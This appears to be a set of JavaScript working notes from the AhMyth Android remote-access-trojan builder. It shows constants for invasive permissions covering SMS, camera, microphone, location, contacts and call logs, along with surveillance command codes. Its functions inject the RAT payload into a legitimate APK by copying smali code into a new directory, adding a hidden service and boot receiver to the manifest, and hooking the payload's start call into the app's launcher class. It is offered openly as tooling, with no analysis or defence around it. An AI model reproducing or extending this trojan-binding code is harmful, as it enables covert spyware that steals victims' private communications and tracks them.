## Updated 'Constants.js' File
```js
var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.apkSourceName = 'Ahmyth';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
    '</intent-filter>' +
    '</receiver>';
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
exports.serviceStart = ';->start()V \n\n' +
'    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
    '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
    '<uses-permission android:name="android.permission.CAMERA"/>',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.INTERNET"/>',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
    '<uses-permission android:name="android.permission.READ_SMS"/>',
    '<uses-permission android:name="android.permission.SEND_SMS"/>',
    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
    '<uses-permission android:name="android.permission.WRITE_SMS"/>',
    '<uses-feature android:name="android.hardware.camera"/>',
    '<uses-feature android:name="android.hardware.camera.autofocus"/>',
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
    '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
    '<uses-permission android:name="android.permission.INSTALL_PACKAGE"/>'
]



//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',

}
```

## Main Class File Location function
> uses the output from the new GetLauncherActivity function to find the Main Hookable Smali Class file of an APK.
> > Used by the recursive file search function below
```js
// function to locate the Main Hookable Smali Class file
// after it has been extracted from the manifest
function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
        .on('data', (entry) => {
            found = true;
            var {
                path, stats: { }
            } = entry;
            var output = `${JSON.stringify(path)}`;
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
        })
        .on('end',
            () => {
                if (!found) {
                    callback('[x] Unable to Locate the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
                    callback('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                } else {
                    callback(null, launcherPath);
                }
            })
        .on('error',
            (err) => {
                callback(err);
            });
}
```

## Main Class Extraction Function
> Supersedes the old GetLauncherActivity function by using xml2js to extract the name of the main hookable class and return it as a smali file
> > Used with the Recursive File Search function below.
```js
function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}
```

## Recursive file search function
> readdirp required!
```js
const readdirp = require('readdirp');
var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
const apkFolder = '/data/data/com.termux/files/home/flappy';
const xml2js = require('xml2js');
const fs = require('fs-extra');
const dir = require('path');

console.log('[★] Reading the Android Manifest file...\n');
fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
  if (error) {
    console.log('[x] Reading the Android Manifest file Failed!\n');
    return;
  }

  xml2js.parseString(data, (err, result) => {
    if (err) {
      console.error(err);
      return;
    }

    const launcherActivity = GetLauncherActivity(result, apkFolder);
    if (launcherActivity === -1) {
      console.log('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
      console.log('[x] Please use Another APK as a Template!.\n');
      return;
    }

    const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
      if (err) {
        console.log(err);
      } else {
        console.log('Launcher Activity Found: ' + launcherPath);
      }

    });

  });

});

function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
        .on('data', (entry) => {
            found = true;
            var {
                path, stats: { }
            } = entry;
            var output = `${JSON.stringify(path)}`;
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
        })
        .on('end',
            () => {
                if (!found) {
                    callback('[x] Unable to Locate the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
                    callback('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                } else {
                    callback(null, launcherPath);
                }
            })
        .on('error',
            (err) => {
                callback(err);
            });
}
```
## Smali Payload Directory Creation Function 
```js
$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

    delayedLog('[★] Copying AhMyth Payload Files to Original App...');
    delayedLog('[★] Reading the Original Decompiled APK...')
    fs.readdir(apkFolder, {
        withFileTypes: true
    }, (error, files) => {
        if (error) {
            delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
            return;
        }
        
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown'];
        var smaliList = files
        .filter((item) => item.isDirectory() &&
            !(ignoreDirs.includes(item.name)))
        .map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length -1];
        if (lastSmali == "smali") {
        delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + "/smali_classes2", {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, "smali_classes2"), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);

                            fs.mkdir(logPath);
                            fs.writeFile(dir.join(logPath, 'Copying.log'),
                                `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        } else {

            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber+1;
            var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
            delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + payloadSmaliFolder, {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };

                delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, payloadSmaliFolder), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);

                            fs.mkdir(logPath);
                            fs.writeFile(dir.join(logPath, 'Copying.log'),
                                `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        };

    });

};
```
## Backup Cross Platform Bind On Launch function
Stored just in case of problems with the original Cross platform bind on launch function
```js
const fs = require('fs-extra');
const xml2js = require('xml2js');
const path = require('path');
const exec = require('child_process').exec;
var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
const apkFolder = '/data/data/com.termux/files/home/flappy';

var copyPermissions = (manifest) => {
    // $appCtrl.copyPermissions = (manifest) => {
    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
    var lastPart = manifest.substring(manifest.indexOf("<application"));

    var permArray = CONSTANTS.permissions;
    for (var i = 0; i < permArray.length; i++) {
        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
        if (firstPart.indexOf(permissionName) == -1) {
            // Check if this is the first permission being added
            if (firstPart.indexOf('uses-permission') == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            } else {
                // Add the permission above the first existing permission
                var index = firstPart.indexOf('<uses-permission');
                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
            }
        }
    }

    return (firstPart + lastPart);
};

//$appCtrl.BindOnLauncher = (apkFolder) => {

    console.log('[★] Finding Launcher Activity From AndroidManifest.xml...');;
    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
        if (error) {
            console.log('[★] Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
            return;
        }

        xml2js.parseString(data, (err, result) => {
            if (err) {
                console.error(err);
                return;
            }

            var launcherActivity = GetLauncherActivity(result, apkFolder);
            if (launcherActivity == -1) {
                console.log("[★] Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                console.log("[★] Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);;
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            console.log('[★] Modifying AndroidManifest.xml...');;
            var permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    console.log('[★] Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
                    return;
                }

                if (process.platform === 'win32') {
                    console.log("[★] Locating Launcher Activity...");
                    exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"'
                        + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"'
                        + ' -file | resolve-path -relative', {
                        'shell': 'powershell.exe'
                    }, (error, stdout, stderr) => {
                        var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                } else if (process.platform === "linux") {
                    console.log("[★] Locating Launcher Activity...");;
                    exec('find -name "' + launcherActivity + '"', {
                        cwd: apkFolder
                    }, (error, stdout, stderr) => {
                        var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                } else {
                    (process.platform === "darwin");
                    console.log("[★] Locating Launcher Activity...");;
                    exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
                        var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");;
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                };

            });

        });

    });
//};
```
